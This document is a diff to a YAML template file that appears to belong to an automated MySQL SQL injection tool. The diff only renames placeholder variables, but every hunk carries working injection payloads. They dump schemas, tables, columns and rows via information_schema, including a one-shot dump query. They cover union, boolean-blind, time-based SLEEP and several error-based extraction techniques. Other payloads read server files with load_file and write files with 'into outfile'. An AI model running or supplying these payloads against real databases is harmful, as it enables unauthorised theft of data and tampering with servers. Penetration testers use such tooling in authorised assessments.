@@ -3,12 +3,12 @@ resource:
  info: |
    concat(
        concat_ws(
-           ${ENCLOSE_VALUE_HEX},
+           ${enclose_value_hex},
            version(),
            database(),
            user()
        ),
-       ${TRAIL_HEX}
+       ${trail_hex}
    )
    
  schema: 
@@ -16,17 +16,17 @@ resource:
    select concat(
        ifnull(
            group_concat(
-               ${ENCLOSE_VALUE_HEX},
+               ${enclose_value_hex},
                r,
-               ${SEPARATOR_QTE_HEX},
+               ${separator_qte_hex},
                q,
-               ${ENCLOSE_VALUE_HEX}
+               ${enclose_value_hex}
                order by r
-               separator ${SEPARATOR_CELL_HEX}
+               separator ${separator_cell_hex}
            ),
-           ${TRAIL_HEX}
+           ${trail_hex}
        ),
-       ${TRAIL_HEX}
+       ${trail_hex}
    ) from (
        select
            cast(SCHEMA_NAME as char) r,
@@ -35,171 +35,171 @@ resource:
        right join INFORMATION_SCHEMA.schemata s
        on s.SCHEMA_NAME = t.table_schema
        group by r
-       {limit}
+       ${limit}
    ) x
    
   table: |
    select concat(
        group_concat(
-           ${ENCLOSE_VALUE_HEX},
+           ${enclose_value_hex},
            r,
-           ${SEPARATOR_QTE_HEX},
+           ${separator_qte_hex},
            q,
-           ${ENCLOSE_VALUE_HEX}
+           ${enclose_value_hex}
            order by r
-           separator ${SEPARATOR_CELL_HEX}
+           separator ${separator_cell_hex}
        ),
-       ${TRAIL_HEX}
+       ${trail_hex}
    ) from (
        select
            cast(TABLE_NAME as char) r,
            cast(ifnull(table_rows, 0x30) as char) q
        from information_schema.tables
-       where TABLE_SCHEMA = 0x${DATABASE.HEX}
+       where TABLE_SCHEMA = 0x${database.hex}
        order by r
-       {limit}
+       ${limit}
    ) x
    
   column: |
    select concat(
        group_concat(
-           ${ENCLOSE_VALUE_HEX},
+           ${enclose_value_hex},
            n,
-           ${SEPARATOR_QTE_HEX},
+           ${separator_qte_hex},
            0,
-           ${ENCLOSE_VALUE_HEX}
+           ${enclose_value_hex}
            order by n
-           separator ${SEPARATOR_CELL_HEX}
+           separator ${separator_cell_hex}
        ),
-       ${TRAIL_HEX}
+       ${trail_hex}
    ) from (
        select cast(COLUMN_NAME as char) n
        from information_schema.columns
-       where TABLE_SCHEMA = 0x${DATABASE.HEX}
-       and TABLE_NAME = 0x${TABLE.HEX}
+       where TABLE_SCHEMA = 0x${database.hex}
+       and TABLE_NAME = 0x${table.hex}
        order by n
-       {limit}
+       ${limit}
    ) x
    
   row: 
    query: |
           select concat(
               group_concat(
-                  ${ENCLOSE_VALUE_HEX},
+                  ${enclose_value_hex},
                   r,
-                  ${SEPARATOR_QTE_HEX},
+                  ${separator_qte_hex},
                   q,
-                  ${ENCLOSE_VALUE_HEX}
+                  ${enclose_value_hex}
                   order by r
-                  separator ${SEPARATOR_CELL_HEX}
+                  separator ${separator_cell_hex}
               ),
-              ${TRAIL_HEX}
+              ${trail_hex}
           ) from (
               select
-                  cast(concat(${FIELDS}) as char) r,
+                  cast(concat(${fields}) as char) r,
                   cast(count(*) as char) q
-              from `${DATABASE}`.`${TABLE}`
+              from `${database}`.`${table}`
               group by r
-              {limit}
+              ${limit}
           ) x
    fields: 
-    field: trim(ifnull(`${FIELD}`, 0x20))
+    field: trim(ifnull(`${field}`, 0x20))
     concat: ",0x7f,"
-  limit: limit ${LIMIT}, 65536
+  limit: limit ${limit.value}, 65536
   
  zipped: 
   database: |
    select concat(
-       ${ENCLOSE_VALUE_HEX},
+       ${enclose_value_hex},
        cast(SCHEMA_NAME as char),
-       '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
    )
    from INFORMATION_SCHEMA.schemata
-   {limit}
+   ${limit}
    
   table: |
    select concat(
-       ${ENCLOSE_VALUE_HEX},
+       ${enclose_value_hex},
        cast(TABLE_NAME as char),
-       '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
    )
    from information_schema.tables
-   where TABLE_SCHEMA = 0x${DATABASE.HEX}
-   {limit}
+   where TABLE_SCHEMA = 0x${database.hex}
+   ${limit}
    
   column: |
    select concat(
-       ${ENCLOSE_VALUE_HEX},
+       ${enclose_value_hex},
        cast(COLUMN_NAME as char),
-       '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
    )
    from information_schema.columns
-   where TABLE_SCHEMA = 0x${DATABASE.HEX}
-   and TABLE_NAME = 0x${TABLE.HEX}
-   {limit}
+   where TABLE_SCHEMA = 0x${database.hex}
+   and TABLE_NAME = 0x${table.hex}
+   ${limit}
    
   row: 
    query: |
           select concat(
-              ${ENCLOSE_VALUE_HEX},
-              cast(concat(${FIELDS}) as char),
-              '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+              ${enclose_value_hex},
+              cast(concat(${fields}) as char),
+              '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
           )
-          from `${DATABASE}`.`${TABLE}`
-          {limit}
+          from `${database}`.`${table}`
+          ${limit}
    fields: 
-    field: trim(ifnull(`${FIELD}`, 0x20))
+    field: trim(ifnull(`${field}`, 0x20))
     concat: ",0x7f,"
-  limit: limit ${LIMIT}, 1
+  limit: limit ${limit.value}, 1
   
  dios: 
   database: |
    select concat(@:=0,(select count(*) from (
        select concat(
-           ${ENCLOSE_VALUE_HEX},
+           ${enclose_value_hex},
            cast(SCHEMA_NAME as char),
-           '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        ) a
        from INFORMATION_SCHEMA.schemata
-   )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
    
   table: |
    select concat(@:=0,(select count(*) from (
        select concat(
-           ${ENCLOSE_VALUE_HEX},
+           ${enclose_value_hex},
            cast(TABLE_NAME as char),
-           '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        ) a
        from information_schema.tables
-       where TABLE_SCHEMA = 0x${DATABASE.HEX}
-   )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+       where TABLE_SCHEMA = 0x${database.hex}
+   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
    
   column: |
    select concat(@:=0,(select count(*) from (
        select concat(
-           ${ENCLOSE_VALUE_HEX},
+           ${enclose_value_hex},
            cast(COLUMN_NAME as char),
-           '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        ) a
        from information_schema.columns
-       where TABLE_SCHEMA = 0x${DATABASE.HEX}
-       and TABLE_NAME = 0x${TABLE.HEX}
-   )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+       where TABLE_SCHEMA = 0x${database.hex}
+       and TABLE_NAME = 0x${table.hex}
+   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
    
   row:
    query: |
           select concat(@:=0,(select count(*) from (
               select concat(
-                  ${ENCLOSE_VALUE_HEX},
-                  cast(concat(${FIELDS}) as char),
-                  '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+                  ${enclose_value_hex},
+                  cast(concat(${fields}) as char),
+                  '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
               ) a
-              from `${DATABASE}`.`${TABLE}`
-          )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+              from `${database}`.`${table}`
+          )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
    fields: 
-    field: trim(ifnull(`${FIELD}`, 0x20))
+    field: trim(ifnull(`${field}`, 0x20))
     concat: ",0x7f,"
-  limit: limit ${LIMIT}, 1
+  limit: limit ${limit.value}, 1
   
  file: 
   privilege: |
@@ -211,14 +211,14 @@ resource:
                where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
                and PRIVILEGE_TYPE = 0x46494c45
            ),
-           ${TRAIL_HEX}
+           ${trail_hex}
        )
        as char
    )
-  read: cast(concat(load_file(0x${FILEPATH.HEX}), ${TRAIL_HEX}) as char)
+  read: cast(concat(load_file(0x${filepath.hex}), ${trail_hex}) as char)
   create: 
-   content: (select 0x${CONTENT.HEX})
-   query: into outfile "${FILEPATH}"
+   content: (select 0x${content.hex})
+   query: into outfile "${filepath}"
    
 strategy: 
  configuration: 
@@ -226,17 +226,17 @@ strategy:
    (
        select
            concat(
-               ${LEAD_HEX},
+               ${lead_hex},
                mid(
-                   (${INJECTION}),
-                   ${INDEX},
-                   ${CAPACITY}
+                   (${injection}),
+                   ${index},
+                   ${capacity}
                )
            )
    )
-  limit: limit ${LIMIT}, 65536
-  failsafe: 1337${INDICE}7330%2b1
-  calibrator: repeat(${CALIBRATOR_HEX}, 65536)
+  limit: limit ${limit.value}, 65536
+  failsafe: 1337${indice}7330%2b1
+  calibrator: repeat(${calibrator_hex}, 65536)
   limitBoundary: 0
   endingComment: --+-
   fingerprint: 
@@ -247,13 +247,13 @@ strategy:
     - MariaDB
     
  normal: 
-  indices: union select ${INDICES}
+  indices: union select ${indices}
   capacity: |
    (
        select concat(
-           ${LEAD_HEX}, 
-           ${INDICE}, 
-           ${CALIBRATOR}
+           ${lead_hex}, 
+           ${indice}, 
+           ${calibrator}
        )
    )
   orderBy: order by 1337
@@ -278,21 +278,21 @@ strategy:
    bit: |
     ascii(
         substring(
-            ${INJECTION}, 
-            ${INDEX}, 
+            ${injection}, 
+            ${index}, 
             1
         )
     ) 
-    %26 ${BIT}
-   length: char_length(${INJECTION}) > ${INDEX}
+    %26 ${bit}
+   length: char_length(${injection}) > ${index}
   modeAnd: and
   modeOr: or
-  blind: ${BOOLEAN.MODE} ${TEST}
+  blind: ${boolean.mode} ${test}
   time: |
-   ${BOOLEAN.MODE} if(
-       ${TEST}, 
+   ${boolean.mode} if(
+       ${test}, 
        1, 
-       SLEEP(${SLEEP_TIME})
+       SLEEP(${sleep_time})
    )
    
  error: 
@@ -302,7 +302,7 @@ strategy:
       and !(
           select * 
           from (
-              ${WINDOW}
+              ${window}
           ) x
       )-~0
      capacity: 64
@@ -315,7 +315,7 @@ strategy:
               select !(
                   select * 
                   from (
-                      ${WINDOW}
+                      ${window}
                   ) x
               )-~0
           ) x
@@ -328,7 +328,7 @@ strategy:
           select !(
               select * 
               from (
-                  ${WINDOW}
+                  ${window}
               ) x
           )-~0
       ) or '
@@ -340,7 +340,7 @@ strategy:
           ~(
               select * 
               from (
-                  ${WINDOW}
+                  ${window}
               ) x
           )
       )
@@ -353,7 +353,7 @@ strategy:
               ~(
                   select * 
                   from (
-                      ${WINDOW}
+                      ${window}
                   ) x
               )
           )
@@ -367,7 +367,7 @@ strategy:
               ~(
                   select * 
                   from (
-                      ${WINDOW}
+                      ${window}
                   ) x
               )
           )
@@ -380,7 +380,7 @@ strategy:
           select
               count(*),
               concat(
-                  (${WINDOW}),
+                  (${window}),
                   floor(rand(0)*2)
               )
           from information_schema.tables
@@ -395,7 +395,7 @@ strategy:
               select
                   count(*),
                   concat(
-                      (${WINDOW}),
+                      (${window}),
                       floor(rand(0)*2)
                   )
               from information_schema.tables
@@ -411,7 +411,7 @@ strategy:
               select
                   count(*),
                   concat(
-                      (${WINDOW}),
+                      (${window}),
                       floor(rand(0)*2)
                   )
               from information_schema.tables
@@ -428,7 +428,7 @@ strategy:
               (
                   select * 
                   from (
-                      ${WINDOW}
+                      ${window}
                   ) x
               )
           )
@@ -443,7 +443,7 @@ strategy:
               (
                   select * 
                   from (
-                      ${WINDOW}
+                      ${window}
                   ) x
               )
           )
@@ -457,7 +457,7 @@ strategy:
               (
                   select * 
                   from (
-                      ${WINDOW}
+                      ${window}
                   ) x
               )
           )
@@ -470,7 +470,7 @@ strategy:
           0x0a, 
           concat(
               0x0a,
-              (${WINDOW})
+              (${window})
           )
       )
      capacity: 99
@@ -483,7 +483,7 @@ strategy:
                   0x0a, 
                   concat(
                       0x0a, 
-                      (${WINDOW})
+                      (${window})
                   )
               )
           ) x
@@ -498,7 +498,7 @@ strategy:
                   0x0a, 
                   concat(
                       0x0a, 
-                      (${WINDOW})
+                      (${window})
                   )
               )
           ) x
